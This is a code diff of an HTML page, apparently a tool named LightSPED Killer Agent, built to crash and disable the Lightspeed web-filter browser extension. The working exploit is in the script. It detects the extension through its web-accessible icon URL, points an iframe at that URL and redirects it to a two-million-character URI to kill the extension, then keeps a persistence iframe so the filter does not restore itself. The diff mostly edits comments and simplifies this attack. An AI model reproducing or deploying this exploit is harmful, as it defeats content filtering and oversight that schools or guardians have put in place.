@@ -75,7 +75,7 @@
     	}
     </style>
     <script>
-	function checkForExtension() { // checks for if u have lightspeed installed
+	function checkForExtension() { // Checks if u have lightspeed installed
             const extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
             fetch(extURL)
                 .then(response => {
@@ -139,27 +139,22 @@
     	    document.body.appendChild(overlay);
 
     	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
-    	    let extFrame1 = document.createElement("iframe");
-	    let extFrame2 = document.createElement("iframe");
-    	    extFrame1.src = extURL;
-    	    extFrame2.src = extURL;
-    	    document.body.appendChild(extFrame1);
-	    document.body.appendChild(extFrame2);
+    	    let extFrame = document.createElement("iframe");
+    	    extFrame.src = extURL;
+    	    document.body.appendChild(extFrame);
     
-	    setTimeout(function() { // Exploit function which creates 2 frames pointing to lightspeed's web accessible url and then redirects them to a 2 million digit long URI
+	    setTimeout(function() { // Exploit function which creates an iframe pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
     		let killURL = "https://" + "e".repeat(2000000);
-    		extFrame1.src = killURL;
-    		extFrame2.src = killURL;
+    		extFrame.src = killURL;
     		setTimeout(function() {
-        	    document.body.removeChild(extFrame1);
-        	    document.body.removeChild(extFrame2);
+        	    document.body.removeChild(extFrame);
         	    document.body.removeChild(overlay);
-        	    let persistFrame = document.createElement("iframe");
+        	    let persistFrame = document.createElement("iframe"); // Persist iframe so lighspeed wont restore itself when the switch is flipped
         	    persistFrame.src = extURL;
         	    document.body.appendChild(persistFrame);
         	    createPopup();
     		}, 1000);
-	    }, 100);
+	    }, 250);
 	}
 
 	function createPopup() {
@@ -270,7 +265,7 @@
 
 	    function checkKilled() {
         	const iframe = document.createElement("iframe");
-        	iframe.src = "https://blobby-boi.github.io/LightSPED-Killer-Agent/blank/"; // attempts loading a blank page to see if lighspeed died
+        	iframe.src = "https://blobby-boi.github.io/LightSPED-Killer-Agent/blank/"; // Attempts loading a blank page to see if lightspeed has been killed
         	iframe.style.width = "1px";
         	iframe.style.height = "1px";
         	iframe.style.position = "absolute";
@@ -296,7 +291,7 @@
     </div>
     <button onclick="hanger()">Launch</button>
     <p>By <a href="https://github.com/Blobby-Boi">Blobby Boi</a></p>
-    <script>
+    <script> // This whole script is just for this one overused background
         const canvas = document.getElementById("background");
         const ctx = canvas.getContext("2d");
 
